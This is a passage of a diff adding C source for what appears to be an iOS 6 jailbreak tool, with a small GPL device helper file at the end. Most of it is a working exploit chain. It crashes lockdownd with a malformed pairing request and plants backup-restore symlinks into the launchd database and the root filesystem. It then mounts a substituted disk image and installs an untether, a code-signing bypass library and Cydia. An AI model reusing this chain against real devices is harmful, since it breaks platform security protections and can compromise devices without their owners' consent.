+    plist_dict_insert_item(crashy, "PairRecord", plist_new_bool(0));
+    plist_to_xml(crashy, &request, &size);
+
+    magic = __builtin_bswap32(size);
+    plist_free(crashy);
+
+    if (idevice_connect(device->client, 62078, &connection)) {
+        ERROR("Failed to connect to lockdownd.\n");
+    }
+    idevice_connection_send(connection, &magic, 4, &sent);
+    idevice_connection_send(connection, request, size, &sent);
+
+    idevice_connection_receive_timeout(connection, &size, 4, &sent, 1500);
+    size = __builtin_bswap32(size);
+    if (size) {
+        void *ptr = malloc(size);
+        idevice_connection_receive_timeout(connection, ptr, &size, &sent, 5000);
+    }
+    idevice_disconnect(connection);
+
+    // XXX: Wait for lockdownd to start.
+    sleep(5);
+}
+
+struct mobile_image_mounter_client_private {
+    void *parent;
+    void *mutex;
+};
+
+char* overrides_plist = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
+"<plist version=\"1.0\">\n"
+"<dict>\n"
+"    <key>com.apple.syslogd</key>\n"
+"    <dict>\n"
+"        <key>Disabled</key>\n"
+"        <true/>\n"
+"    </dict>\n"
+"</dict>\n"
+"</plist>\n";
+
+void callback(ZipInfo* info, CDFile* file, size_t progress) {
+    int percentDone = progress * 100/file->compressedSize;
+    printf("Getting: %d%%\n", percentDone);
+}
+
+int jailbreak_device(const char *uuid, status_cb_t cb)
+{
+    char backup_dir[1024];
+    device_t *device = NULL;
+    char *build = NULL;
+    char *product = NULL;
+    struct lockdownd_service_descriptor desc = { 0, 0 };
+    int is_jailbroken = 0;
+
+    if (!uuid) {
+        ERROR("Missing device UDID\n");
+        return -1;
+    }
+
+    assert(cb);
+
+    tmpnam(backup_dir);
+    DEBUG("Backing up files to %s\n", backup_dir);
+
+    // Wait for a connection
+    DEBUG("Connecting to device...\n");
+
+    cb("Connecting to device...\n", 2);
+
+    int retries = 20;
+    int i = 0;
+    while (!connected && (i++ < retries)) {
+        sleep(1);
+    }
+
+    if (!connected) {
+        ERROR("Device connection failed\n");
+        return -1;
+    }
+    // Open a connection to our device
+    DEBUG("Opening connection to device\n");
+    device = device_create(uuid);
+    if (device == NULL) {
+        ERROR("Unable to connect to device\n");
+    }
+
+    lockdown_t *lockdown = lockdown_open(device);
+    if (lockdown == NULL) {
+        WARN("Lockdown connection failed\n");
+        device_free(device);
+        return -1;
+    }
+
+    if ((lockdown_get_string(lockdown, "HardwareModel", &product) != LOCKDOWN_E_SUCCESS)
+        || (lockdown_get_string(lockdown, "BuildVersion", &build) != LOCKDOWN_E_SUCCESS)) {
+        ERROR("Could not get device information\n");
+        if (product) {
+            free(product);
+        }
+        if (build) {
+            free(build);
+        }
+        lockdown_free(lockdown);
+        device_free(device);
+        return -1;
+    }
+
+    cb("Getting payload files from Apple... (if this fails, your internet connection has issues...)\n", 5);
+
+    struct stat st;
+    /* Hackcheck for network connection... */ 
+    ZipInfo* info2 = PartialZipInit("http://appldnld.apple.com/iOS6.1/091-2397.20130319.EEae9/iPad2,1_6.1.3_10B329_Restore.ipsw");
+    if(!info2) {
+        ERROR("Cannot make PartialZip context\n");
+        return -1;
+    }
+    PartialZipSetProgressCallback(info2, callback);
+    CDFile* file = PartialZipFindFile(info2, "BuildManifest.plist");
+    if(!file) {
+        ERROR("cannot file find\n");
+        return -1;
+    }
+    PartialZipRelease(info2);
+
+    DEBUG("Device info: %s, %s\n", product, build);
+
+    DEBUG("Beginning jailbreak, this may take a while...\n");
+    cb("Gathering information to generate jailbreak data...\n", 10);
+
+    uint16_t port = 0;
+
+    is_ddid = 0;
+
+    if (lockdown_start_service(lockdown, "com.apple.afc2", &port) == 0) {
+        char **fileinfo = NULL;
+        uint32_t ffmt = 0;
+
+        afc_client_t afc2 = NULL;
+        desc.port = port;
+        afc_client_new(device->client, &desc, &afc2);
+        if (afc2) {
+            afc_get_file_info(afc2, "/Applications", &fileinfo);
+            if (fileinfo) {
+                int i;
+                for (i = 0; fileinfo[i]; i += 2) {
+                    if (!strcmp(fileinfo[i], "st_ifmt")) {
+                        if (strcmp(fileinfo[i + 1], "S_IFLNK") == 0) {
+                            ffmt = 1;
+                        }
+                        break;
+                    }
+                }
+                afc_free_dictionary(fileinfo);
+                fileinfo = NULL;
+
+                if (ffmt) {
+                    ERROR("Device already jailbroken! Detected stash.");
+                    afc_client_free(afc2);
+                    lockdown_free(lockdown);
+                    device_free(device);
+                    cb("Device already jailbroken, detected stash.", 100);
+                    return 0;
+                }
+            }
+
+            afc_get_file_info(afc2, "/private/etc/launchd.conf", &fileinfo);
+            if (fileinfo) {
+                ERROR("Device already jailbroken! Detected untether.");
+                afc_client_free(afc2);
+                lockdown_free(lockdown);
+                device_free(device);
+                cb("Device already jailbroken, detected untether.", 100);
+                return 0;
+            }
+
+            afc_client_free(afc2);
+        }
+    }
+
+    if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
+        ERROR("Failed to start AFC service", 0);
+        lockdown_free(lockdown);
+        device_free(device);
+        return -1;
+    }
+    lockdown_free(lockdown);
+    lockdown = NULL;
+
+    afc_client_t afc = NULL;
+    desc.port = port;
+    afc_client_new(device->client, &desc, &afc);
+    if (!afc) {
+        ERROR("Could not connect to AFC service\n");
+        device_free(device);
+        return -1;
+    }
+    // check if directory exists
+    char **list = NULL;
+    if (afc_read_directory(afc, "/" AFCTMP, &list) != AFC_E_SUCCESS) {
+        // we're good, directory does not exist.
+    } else {
+        free_dictionary(list);
+        WARN("Looks like you attempted to apply this Jailbreak and it failed. Will try to fix now...\n", 0);
+        sleep(5);
+        goto fix;
+    }
+
+    afc_client_free(afc);
+    afc = NULL;
+
+    /** SYMLINK: Recordings/.haxx -> /var */
+    rmdir_recursive(backup_dir);
+    mkdir(backup_dir, 0755);
+    char *bargv[] = {
+        "idevicebackup2",
+        "backup",
+        backup_dir,
+        NULL
+    };
+    char *rargv[] = {
+        "idevicebackup2",
+        "restore",
+        "--system",
+        "--settings",
+        "--reboot",
+        backup_dir,
+        NULL
+    };
+    char *rargv2[] = {
+        "idevicebackup2",
+        "restore",
+        "--system",
+        "--settings",
+        backup_dir,
+        NULL
+    };
+    backup_t *backup;
+
+    rmdir_recursive(backup_dir);
+    mkdir(backup_dir, 0755);
+    idevicebackup2(3, bargv);
+
+    cb("Sending initial data...\n", 15);
+    backup = backup_open(backup_dir, uuid);
+    if (!backup) {
+        fprintf(stderr, "ERROR: failed to open backup\n");
+        return -1;
+    }
+
+    /* Reboot for the sake of posterity. Gets rid of all Developer images mounted. */
+    {
+        if (backup_mkdir(backup, "MediaDomain", "Media/Recordings", 0755, 501, 501, 4) != 0) {
+            ERROR("Could not make folder\n");
+            return -1;
+        }
+
+        if (backup_symlink(backup, "MediaDomain", "Media/Recordings/.haxx", "/var/db/launchd.db/com.apple.launchd", 501, 501, 4) != 0) {
+            ERROR("Failed to symlink var!\n");
+            return -1;
+        }
+
+        FILE *f = fopen("payload/common/overrides.plist", "wb+");
+        fwrite(overrides_plist, sizeof(overrides_plist), 1, f);
+        fclose(f);
+        if (backup_add_file_from_path(backup, "MediaDomain", "payload/common/overrides.plist", "Media/Recordings/.haxx/overrides.plist", 0100755, 0, 0, 4) != 0) {
+            ERROR("Could not add tar");
+            return -1;
+        }
+    }
+    idevicebackup2(6, rargv);
+    unlink("payload/common/overrides.plist");
+    backup_free(backup);
+
+    cb("Waiting for reboot. Do not unplug your device.\n", 18);
+
+    /********************************************************/
+    /* wait for device reboot */
+    /********************************************************/
+
+    // wait for disconnect
+    while (connected) {
+        sleep(2);
+    }
+    DEBUG("Device %s disconnected\n", uuid);
+
+    // wait for device to connect
+    while (!connected) {
+        sleep(2);
+    }
+    DEBUG("Device %s detected. Connecting...\n", uuid);
+    sleep(10);
+
+    /********************************************************/
+    /* wait for device to finish booting to springboard */
+    /********************************************************/
+    device = device_create(uuid);
+    if (!device) {
+        ERROR("ERROR: Could not connect to device. Aborting.");
+        // we can't recover since the device connection failed...
+        return -1;
+    }
+
+    lockdown = lockdown_open(device);
+    if (!lockdown) {
+        device_free(device);
+        ERROR("ERROR: Could not connect to lockdown. Aborting");
+        // we can't recover since the device connection failed...
+        return -1;
+    }
+
+    retries = 100;
+    int done = 0;
+    sbservices_client_t sbsc = NULL;
+    plist_t state = NULL;
+    DEBUG("Waiting for SpringBoard...\n");
+
+    while (!done && (retries-- > 0)) {
+        port = 0;
+        lockdown_start_service(lockdown, "com.apple.springboardservices",
+                               &port);
+        if (!port) {
+            continue;
+        }
+        sbsc = NULL;
+        desc.port = port;
+        sbservices_client_new(device->client, &desc, &sbsc);
+        if (!sbsc) {
+            continue;
+        }
+        if (sbservices_get_icon_state(sbsc, &state, "2") ==
+            SBSERVICES_E_SUCCESS) {
+            plist_free(state);
+            state = NULL;
+            done = 1;
+        }
+        sbservices_client_free(sbsc);
+        if (done) {
+            sleep(3);
+            DEBUG("bootup complete\n");
+            break;
+        }
+        sleep(3);
+    }
+    lockdown_free(lockdown);
+    lockdown = NULL;
+
+    /* Download images. */
+    if(stat("payload/iOSUpdaterHelper.dmg", &st)) {
+        ZipInfo* info = PartialZipInit("http://appldnld.apple.com/iOS6/041-8518.20121029.CCrt9/iOSUpdater.ipa");
+        if(!info) {
+            ERROR("Cannot make PartialZip context\n");
+            return -1;
+        }
+        PartialZipSetProgressCallback(info, callback);
+        CDFile* file = PartialZipFindFile(info, "Payload/iOSUpdater.app/iOSUpdaterHelper.dmg");
+        if(!file)
+        {
+            ERROR("Cannot find file in zip 1\n");
+            return -1;
+        }
+        unsigned char* data = PartialZipGetFile(info, file);
+        int dataLen = file->size; 
+        PartialZipRelease(info);
+        data = realloc(data, dataLen + 1);
+        data[dataLen] = '\0';
+        FILE* out;
+        out = fopen("payload/iOSUpdaterHelper.dmg", "wb+");
+        if (out == NULL)
+        {
+            ERROR("Failed to open file");
+            return -1;
+        }
+        fwrite(data, sizeof(char), dataLen, out);
+        fclose(out);
+        free(data);
+    }
+
+    if(stat("payload/iOSUpdaterHelper.dmg.signature", &st)) {
+        ZipInfo* info = PartialZipInit("http://appldnld.apple.com/iOS6/041-8518.20121029.CCrt9/iOSUpdater.ipa");
+        if(!info) {
+            ERROR("Cannot make PartialZip context\n");
+            return -1;
+        }
+        PartialZipSetProgressCallback(info, callback);
+        CDFile* file = PartialZipFindFile(info, "Payload/iOSUpdater.app/iOSUpdaterHelper.dmg.signature");
+        if(!file)
+        {
+            ERROR("Cannot find file in zip 2\n");
+            return -1;
+        }
+        unsigned char* data = PartialZipGetFile(info, file);
+        int dataLen = file->size; 
+        PartialZipRelease(info);
+        data = realloc(data, dataLen + 1);
+        data[dataLen] = '\0';
+        FILE* out;
+        out = fopen("payload/iOSUpdaterHelper.dmg.signature", "wb+");
+        if (out == NULL)
+        {
+            ERROR("Failed to open file");
+            return -1;
+        }
+        fwrite(data, sizeof(char), dataLen, out);
+        fclose(out);
+        free(data);
+    }
+
+    /*
+     * Upload DDI original. 
+     */
+    real_dmg = "payload/iOSUpdaterHelper.dmg";
+    real_dmg_signature = "payload/iOSUpdaterHelper.dmg.signature";
+    ddi_dmg = "payload/hax.dmg";
+
+    cb("Waiting for device...\n", 25);
+
+    //dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+                   AMDAddLogFileDescriptor(2); 
+                   am_device_notification * notif;
+                   assert(!AMDeviceNotificationSubscribe(cb2, 0, 0, NULL, &notif)); 
+                   CFRunLoopRun();
+    //});
+
+    while (!is_ddid) ;
+
+    if (is_ddid == -1) {
+        ERROR("Failed to mount image\n");
+        cb("Failed to mount image\n", 10);
+        return -1;
+    }
+
+    /** DDI Mounted! */
+
+    if (!lockdown)
+        lockdown = lockdown_open(device);
+
+    cb("Remounting root...\n", 40);
+    if (lockdown_start_service(lockdown, "r", &port) != 0) {
+        DEBUG("Timed out on doing so... doesn't really matter though..\n");
+    }
+
+    /* Delete files */
+    unlink("payload/iOSUpdaterHelper.dmg");
+    unlink("payload/iOSUpdaterHelper.dmg.signature");
+
+    /** Install bootstrap. */
+    rmdir_recursive_afc(afc, "/Recordings", 1);
+
+    if (lockdown_start_service(lockdown, "com.apple.afc2", &port) != 0) {
+        ERROR("Device failed to mount image proper!\n");
+        return -1;
+    }
+
+    /*
+     * Goody, goody. Let's copy everything over!
+     */
+
+    cb("Sending Cydia and untether payload to the device...\n", 70);
+
+    rmdir_recursive(backup_dir);
+    mkdir(backup_dir, 0755);
+
+    if (!afc) {
+        lockdown = lockdown_open(device);
+        port = 0;
+        if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
+            WARN("Could not start AFC service. Aborting.\n");
+            lockdown_free(lockdown);
+            goto leave;
+        }
+        lockdown_free(lockdown);
+
+        desc.port = port;
+        afc_client_new(device->client, &desc, &afc);
+        if (!afc) {
+            WARN("Could not connect to AFC. Aborting.\n");
+            goto leave;
+        }
+    }
+    rmdir_recursive_afc(afc, "/Recordings", 1);
+    idevicebackup2(3, bargv);
+
+    backup = backup_open(backup_dir, uuid);
+    if (!backup) {
+        fprintf(stderr, "ERROR: failed to open backup\n");
+        return -1;
+    }
+
+    /*
+     * Do it again.
+     */
+    {
+        if (backup_mkdir(backup, "MediaDomain", "Media/Recordings", 0755, 501, 501, 4) != 0) {
+            ERROR("Could not make folder\n");
+            return -1;
+        }
+
+        if (backup_symlink(backup, "MediaDomain", "Media/Recordings/.haxx", "/", 501, 501, 4) != 0) {
+            ERROR("Failed to symlink root!\n");
+            return -1;
+        }
+
+        if (backup_mkdir(backup, "MediaDomain", "Media/Recordings/.haxx/var/untether", 0755, 0, 0, 4) != 0) {
+            ERROR("Could not make folder\n");
+            return -1;
+        }
+
+        {
+            char jb_path[128];
+            char amfi_path[128];
+            char launchd_conf_path[128];
+
+            snprintf(jb_path, 128, "payload/common/untether", build, product);
+            snprintf(amfi_path, 128, "payload/common/_.dylib", build, product);
+            snprintf(launchd_conf_path, 128, "payload/common/launchd.conf", build, product);
+
+            if (backup_add_file_from_path(backup, "MediaDomain", launchd_conf_path, "Media/Recordings/.haxx/var/untether/launchd.conf", 0100644, 0, 0, 4) != 0) {
+                ERROR("Could not add launchd.conf");
+                return -1;
+            }
+            if (backup_symlink(backup, "MediaDomain", "Media/Recordings/.haxx/private/etc/launchd.conf", "/private/var/untether/launchd.conf", 0, 0, 4) != 0) {
+                ERROR("Failed to symlink launchd.conf!\n");
+                return -1;
+            }
+            if (backup_add_file_from_path(backup, "MediaDomain", "payload/common/tar", "Media/Recordings/.haxx/var/untether/tar", 0100755, 0, 0, 4) != 0) {
+                ERROR("Could not add tar");
+                return -1;
+            }
+
+            if (backup_symlink(backup, "MediaDomain", "Media/Recordings/.haxx/bin/tar", "/private/var/untether/tar", 0, 0, 4) != 0) {
+                ERROR("Failed to symlink tar!\n");
+                return -1;
+            }
+            if (backup_symlink(backup, "MediaDomain", "Media/Recordings/.haxx/usr/libexec/dirhelper", "/private/var/untether/dirhelper", 0, 0, 4) != 0) {
+                ERROR("Failed to symlink dirhelper!\n");
+                return -1;
+            }
+            if (backup_add_file_from_path(backup, "MediaDomain", "payload/common/install.deb", "Media/Recordings/.haxx/var/untether/install.deb", 0100755, 0, 0, 4) != 0) {
+                ERROR("Could not add dirhelper");
+                return -1;
+            }
+            if (backup_add_file_from_path(backup, "MediaDomain", "payload/common/dirhelper", "Media/Recordings/.haxx/var/untether/dirhelper", 0100755, 0, 0, 4) != 0) {
+                ERROR("Could not add dirhelper");
+                return -1;
+            }
+            if (backup_add_file_from_path(backup, "MediaDomain", jb_path, "Media/Recordings/.haxx/var/untether/untether", 0100755, 0, 0, 4) != 0) {
+                ERROR("Could not add jb");
+                return -1;
+            }
+            if (backup_add_file_from_path(backup, "MediaDomain", amfi_path, "Media/Recordings/.haxx/var/untether/_.dylib", 0100644, 0, 0, 4) != 0) {
+                ERROR("Could not add amfi");
+                return -1;
+            }
+            if (backup_add_file_from_path(backup, "MediaDomain", "payload/Cydia.tar", "Media/Recordings/.haxx/var/untether/Cydia.tar", 0100644, 0, 0, 4) != 0) {
+                ERROR("Could not add cydia");
+                return -1;
+            }
+        }
+    }
+    idevicebackup2(5, rargv2);
+
+    backup_free(backup);
+
+    cb("Finalizing...\n", 90);
+    DEBUG("Installed jailbreak, fixing up directories.\n");
+    rmdir_recursive_afc(afc, "/Recordings", 1);
+
+    /********************************************************/
+    /*
+     * move back any remaining dirs via AFC 
+     */
+    /********************************************************/
+
+    is_jailbroken = 1;
+
+ fix:
+    DEBUG("Recovering files...\n", 80);
+    if (!afc) {
+        lockdown = lockdown_open(device);
+        port = 0;
+        if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
+            WARN("Could not start AFC service. Aborting.\n");
+            lockdown_free(lockdown);
+            goto leave;
+        }
+        lockdown_free(lockdown);
+        lockdown = NULL;
+
+        desc.port = port;
+        afc_client_new(device->client, &desc, &afc);
+        if (!afc) {
+            WARN("Could not connect to AFC. Aborting.\n");
+            goto leave;
+        }
+    }
+
+    rmdir_recursive(backup_dir);
+
+    WARN("Recovery complete.\n");
+
+    if (is_jailbroken) {
+        cb("Your device is now jailbroken, it is now preparing to reboot automatically.\n", 100);
+        WARN("Your device is now jailbroken, it is now preparing to reboot automatically.\n");
+
+        /*
+         * Reboot device automatically. 
+         */
+        lockdown = lockdown_open(device);
+        diagnostics_relay_client_t diagnostics_client = NULL;
+        uint16_t diag_port = 0;
+
+        lockdown_start_service(lockdown, "com.apple.mobile.diagnostics_relay", &diag_port);
+
+        desc.port = diag_port;
+        if (diagnostics_relay_client_new(device->client, &desc, &diagnostics_client) == DIAGNOSTICS_RELAY_E_SUCCESS) {
+            diagnostics_relay_restart(diagnostics_client, 0);
+        }
+
+    } else {
+        cb("Your device has encountered an error during the jailbreak process, unplug it and try again.\n", 100);
+        WARN("Your device has encountered an error during the jailbreak process, unplug it and try again.\n");
+    }
+
+ leave:
+    afc_client_free(afc);
+    afc = NULL;
+    device_free(device);
+    device = NULL;
+    return 0;
+}
+/**
+ * device.c
+ * Copyright (C) 2010 Joshua Hill
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ **/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <libimobiledevice/libimobiledevice.h>
+#include <libimobiledevice/lockdown.h>
+
+#include "common.h"
+
+device_t *device_create(const char *uuid)
+{
+    idevice_error_t err = 0;
+    device_t *device = NULL;
+    device = (device_t *) malloc(sizeof(device_t));
+    if (device == NULL) {
+        return NULL;
+    }
+    memset(device, '\0', sizeof(device_t));
+
+    if (uuid == NULL) {
+        err = idevice_new(&(device->client), NULL);
+        if (err != IDEVICE_E_SUCCESS) {
+            fprintf(stderr,
+                    "No device found with uuid %s, is it plugged in?\n", uuid);
+            return NULL;
+        }
+        idevice_get_udid(device->client, (char **)&device->uuid);
+
+    } else {
+        err = idevice_new(&(device->client), uuid);
+        if (err != IDEVICE_E_SUCCESS) {
+            fprintf(stderr,
+                    "No device found with uuid %s, is it plugged in?\n", uuid);
+            return NULL;
+        }
+        device->uuid = strdup(uuid);
+    }
+
+    return device;
+}
+
+void device_free(device_t * device)
+{
+    if (device) {
+        if (device->uuid) {
+            free(device->uuid);
+            device->uuid = NULL;
+        }
+        if (device->client) {
+            idevice_free(device->client);
+        }
+        free(device);
+    }
+}
+
+void device_enable_debug()
+{
+    idevice_set_debug_level(3);
+}
